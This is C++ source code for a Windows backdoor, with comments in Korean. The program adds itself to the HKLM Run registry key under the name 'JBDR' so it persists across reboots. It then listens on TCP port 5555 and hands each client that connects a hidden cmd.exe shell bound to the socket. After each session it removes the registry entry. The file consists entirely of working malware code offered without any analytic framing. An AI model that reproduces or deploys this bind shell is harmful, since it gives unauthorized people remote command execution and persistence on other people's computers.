#undef UNICODE
#include<WinSock2.h>
#include<Windows.h>
#include<conio.h>
#include<stdio.h>
#include<stdlib.h>
#include<iostream>
#include<io.h>
#include<fcntl.h>
#pragma comment(lib, "ws2_32.lib")
//#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")

#define PORT 5555
#define BUFSIZE 4096
using std::cout;
using std::endl;

HANDLE MyrPipe = NULL;
HANDLE MywPipe = NULL;
HANDLE YourrPipe = NULL;
HANDLE YourwPipe = NULL;


char subkey[] = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run";//\\JBDR";
char delkey[] = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\JBDR";
char key_name[] = "JBDR";
char key_value[256];
HKEY key_handle;

DWORD WINAPI SendThread()
{
	////////////////////////////////////////////////////////
	DWORD nWrite;
	char buffer[BUFSIZE];
	while(1)
	{
		memset(buffer,0,sizeof(buffer));
		scanf("%s",&buffer);
		if(strcmp(buffer,"deldeldel") == 0)
			printf("deldeldel ok");
		nWrite = strlen(buffer);
		buffer[nWrite] = '\n';
		buffer[nWrite+1]=0;

		WriteFile(MywPipe,buffer,BUFSIZE,&nWrite,NULL);

		Sleep(100);
	}
}
DWORD WINAPI ReceiveThread()
{
	DWORD nRead;
	char buffer[BUFSIZE];
	while(1)
	{
		memset(buffer,0,sizeof(buffer));
		ReadFile(YourrPipe,buffer,BUFSIZE,&nRead,NULL);
		//buffer[nRead] = '\n';
		//printf("%s",buffer);
		
		Sleep(100);
	}
}
		
int main(int argc, char* argv[])
{
	WORD wVersionRequired;
	WSADATA wsaData;
	SOCKET server;
	SOCKADDR_IN addr_server;
	SOCKET client;
	SOCKADDR_IN addr_client;
	int addressLen = sizeof(addr_client);
	char buf[BUFSIZE+1];
	//int ret;
	
	strcpy(key_value,argv[0]);
	int key_value_size = strlen(key_value)+1;
	
	LSTATUS ret;
	ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE,subkey,0,NULL, REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,&key_handle,0);

	//cout<<ret<<endl;
	if(ret != ERROR_SUCCESS)
	{
		DWORD error = GetLastError();
		cout<<"CreateKey error : "<<error<<endl;
		//Sleep(2000);
		exit(0);
	}
	ret = RegSetValueEx(key_handle, key_name, 0, REG_SZ, (BYTE*)key_value, key_value_size);

	if(ret != ERROR_SUCCESS)
	{
		DWORD error = GetLastError();
		cout<<"SetValue error : "<<error<<endl;
		//Sleep(2000);
		exit(0);
	}
	Sleep(2000);
	RegCloseKey(key_handle);

	//소켓 생성
	wVersionRequired = MAKEWORD(2,2);
	if(WSAStartup(wVersionRequired,&wsaData) != 0)
	{
		printf("WSAStartup\n");
		getchar();
		return -1;
	}
	server = WSASocket(AF_INET, SOCK_STREAM,6,0,0,0);//socket(AF_INET, SOCK_STREAM, 0);//
	if( server == INVALID_SOCKET)
	{
		printf("socket()\n");
		getchar();
		return -1;
	}
	
	//바인드
	addr_server.sin_family = AF_INET;
	addr_server.sin_addr.s_addr = htonl(INADDR_ANY);
	addr_server.sin_port = htons(PORT);
	if(bind(server,(LPSOCKADDR)&addr_server, sizeof(addr_server)) == SOCKET_ERROR)
	{
		printf("bind()\n");
		getchar();
		return -1;
	}
	while(1)
	{
		//리슨
		if(listen(server,SOMAXCONN) == SOCKET_ERROR)
		{
			printf("listen()\n");
			getchar();
			return -1;
		}
		//억셉트
		client = accept(server,(LPSOCKADDR)&addr_client,&addressLen);
		if( client == INVALID_SOCKET)
			continue;
		printf("\n[Connected] Client IP : %s , PORT : %d\n",inet_ntoa(addr_client.sin_addr), ntohs(addr_client.sin_port));
		/////소켓을 핸들로 바꾸었다!
		int fd_sock = _open_osfhandle((intptr_t)client,_O_TEXT);
		HANDLE h_sock = (HANDLE)_get_osfhandle(fd_sock);
		
		STARTUPINFO si = {0,};
		si.cb = sizeof(si);
		PROCESS_INFORMATION pi = {0,};
		TCHAR szCommandLine[] = TEXT("cmd");
		HANDLE hProcess;
		//HANDLE lStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		si.hStdInput = h_sock;
		si.hStdOutput = h_sock;
		si.hStdError = h_sock;
		si.wShowWindow = SW_HIDE;
	
		CreateProcess(NULL,szCommandLine,NULL,NULL,TRUE,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
		WaitForSingleObject(pi.hProcess,INFINITE);
		//연결됨.
		// rcv, send
		//소켓 종료
		closesocket(client);

		///레지삭제
		//////////////////////////////////////////
		RegOpenKeyEx(HKEY_LOCAL_MACHINE,subkey,0,KEY_ALL_ACCESS, &key_handle);
		RegDeleteKeyEx(HKEY_LOCAL_MACHINE, delkey, KEY_ALL_ACCESS | KEY_WOW64_32KEY,0);
		RegCloseKey(key_handle);

		///////////////////////////////////////////////////


		printf("[Disconnected] Client IP : %s , PORT : %d\n", 
			inet_ntoa(addr_client.sin_addr), ntohs(addr_client.sin_port));
	}
	/*
	SECURITY_ATTRIBUTES saAttr = {0,}; 
	WORD buffer[4096];
	// Set the bInheritHandle flag so pipe handles are inherited. 

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL; 

	if(!CreatePipe(&MyrPipe, &MywPipe, &saAttr, 4096))
	{
		return -1;
	}

	if(!CreatePipe(&YourrPipe, &YourwPipe, &saAttr, 4096))
	{
		return -1;
	}
	*/
	
	Sleep(2000);
	//CreateThread(0,0,(LPTHREAD_START_ROUTINE)SendThread,0,0,0);
	//CreateThread(0,0,(LPTHREAD_START_ROUTINE)ReceiveThread,0,0,0);
	
	
	
	//printf("윈도우 번호 : %x PID : %d HPROCESS : %d\n",hwnd, pid, hProcess);
	//getch();
	//TerminateProcess(hProcess,0);///?????????????????????????????????
	
}